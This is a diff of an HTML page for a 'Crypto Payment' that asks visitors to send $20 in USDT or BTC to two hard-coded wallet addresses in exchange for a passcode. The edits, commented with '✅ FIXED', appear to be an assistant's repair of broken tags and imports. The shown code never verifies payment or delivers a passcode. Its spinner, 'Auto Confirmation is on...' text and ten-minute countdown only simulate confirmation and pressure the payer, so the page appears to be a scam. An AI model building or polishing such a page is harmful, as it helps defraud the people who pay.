@@ -3,12 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Font Awesome -->
     <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
-    <link rel="stylesheet" href="wght@500&display=swap">https://fonts.googleapis.com/css2?family=Poppins&family=Quicksand:wght@500&display=swap">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-5qWf+gBH6AAK2TRfzbyyJy64ZJkRVF1sBxpz+o0UbgksbQGxzyGGpVtQ+YQCRRuQK9GK8UuD4zTtxef1zYxpwg==" crossorigin="anonymous" />
-    <!-- SweetAlert library -->
-    <script src="sweetalert2@11">https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- ✅ FIXED Google Fonts -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins&family=Quicksand:wght@500&display=swap">
+
+    <!-- Font Awesome CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+
+    <!-- ✅ FIXED SweetAlert -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- ✅ Added jQuery (needed for your script) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
     <title>Document</title>
+
     <style>
         * {
             box-sizing: border-box;
@@ -62,50 +74,64 @@
         }
         .copy-icon {
             margin-left: 5px;
+            cursor: pointer;
         }
         @keyframes spinner-fade {
-            0% {
-                background-color: #69717d;
-            }
-            100% {
-                background-color: transparent;
-            }
+            0% { background-color: #69717d; }
+            100% { background-color: transparent; }
         }
     </style>
 </head>
+
 <body>
     <div class="modal">
         <h3>Crypto Payment</h3>
+
         <p>Make your payment of $20 worth of USDT (TRC20) or BTC through any cryptocurrency application, select any of the wallet address below and pay into.</p>
-        <P>Your five digit ( 5 ) passcode will automatically display below immediately your payment it’s confirmed ✅</P>
+
+        <p>Your five digit (5) passcode will automatically display below immediately your payment it’s confirmed ✅</p>
+
         <div class="container">
             <center>
-                <img src="img/crypto.jpg" alt="" width="100%" style="max-width: 300px; border-radius: 15px;">
+                <img src="img/crypto.jpg" width="100%" style="max-width: 300px; border-radius: 15px;">
             </center>
         </div>
-        <!-- BTC Wallet Address with Copy Button -->
-        USDT:<h3 class="btc-address" style="font-size: 9.5px;">TPieSex3rB6k3JrRLDQBn8cyQDx5j3VEKS><i class="far fa-copy copy-icon"></i></h3>
-         <!-- BTC Wallet Address with Copy Button -->
-        B.T.C:<h3 class="btc-address" style="font-size: 10px;">bc1qqts75raevfed2xq3rmughwjgy9yckf3u9uw3fj</i></h3>
+
+        <!-- ✅ FIXED USDT -->
+        USDT:
+        <h3 class="btc-address" style="font-size: 9.5px;">
+            TPieSex3rB6k3JrRLDQBn8cyQDx5j3VEKS
+            <i class="far fa-copy copy-icon"></i>
+        </h3>
+
+        <!-- BTC -->
+        B.T.C:
+        <h3 style="font-size: 10px;">
+            bc1qqts75raevfed2xq3rmughwjgy9yckf3u9uw3fj
+        </h3>
+
+        <!-- Spinner -->
         <div class="spinner center">
-            <!-- Repeated spinner blades -->
             <?php for ($i = 0; $i < 12; $i++) { ?>
                 <div class="spinner-blade"></div>
             <?php } ?>
         </div>
+
         <p>Auto Confirmation is on...</p>
         <p id="countdown">Payment will close in <span id="timer">10:00</span> mins</p>
     </div>
-    <!-- Your existing script remains unchanged -->
+
+    <!-- Scripts -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            // Close the page after 10 minutes
+
             setTimeout(function () {
                 window.location.href = "index.html";
-            }, 600000); // 10 minutes in milliseconds
-            // Copy BTC wallet address to clipboard
+            }, 600000);
+
             var btcAddress = document.querySelector('.btc-address');
             var copyIcon = document.querySelector('.copy-icon');
+
             copyIcon.addEventListener('click', function () {
                 var tempInput = document.createElement('input');
                 tempInput.value = btcAddress.innerText;
@@ -113,24 +139,26 @@
                 tempInput.select();
                 document.execCommand('copy');
                 document.body.removeChild(tempInput);
-                
-                // Show SweetAlert
+
                 Swal.fire({
                     icon: 'success',
                     title: 'USDT Address Copied',
-                    showCancelButton: false,
                     showConfirmButton: false,
-                    text: 'The USDT address has been copied to the clipboard!',
+                    text: 'The USDT address has been copied!',
                 });
             });
-            // Countdown timer
-            var countdown = 600; // 10 minutes in seconds
+
+            var countdown = 600;
             var timerDisplay = document.getElementById('timer');
+
             function updateTimer() {
                 var minutes = Math.floor(countdown / 60);
                 var seconds = countdown % 60;
-                timerDisplay.textContent = minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+                timerDisplay.textContent =
+                    minutes.toString().padStart(2, '0') + ':' +
+                    seconds.toString().padStart(2, '0');
             }
+
             setInterval(function () {
                 if (countdown > 0) {
                     countdown--;
@@ -139,24 +167,27 @@
             }, 1000);
         });
     </script>
-<center>
-    <p>
-           <div class="password">
-    <input type="test" id="password-input" placeholder="Введите пароль" name="password" value="Passcode will display here..." readonly>
-    <a href="#" class="password-control"></a><br><br>
-</div>
-</center>
-     <script>
-        $('body').on('click', '.password-control', function(){
-    if ($('#password-input').attr('type') == 'password'){
-        $(this).addClass('view');
-        $('#password-input').attr('type', 'text');
-    } else {
-        $(this).removeClass('view');
-        $('#password-input').attr('type', 'password');
-    }
-    return false;
-});
+
+    <center>
+        <div class="password">
+            <!-- ✅ FIXED input type -->
+            <input type="text" id="password-input" value="Passcode will display here..." readonly>
+            <a href="#" class="password-control"></a><br><br>
+        </div>
+    </center>
+
+    <script>
+        $('body').on('click', '.password-control', function () {
+            if ($('#password-input').attr('type') == 'password') {
+                $(this).addClass('view');
+                $('#password-input').attr('type', 'text');
+            } else {
+                $(this).removeClass('view');
+                $('#password-input').attr('type', 'password');
+            }
+            return false;
+        });
     </script>
+
 </body>
-  </html>
+    </html>
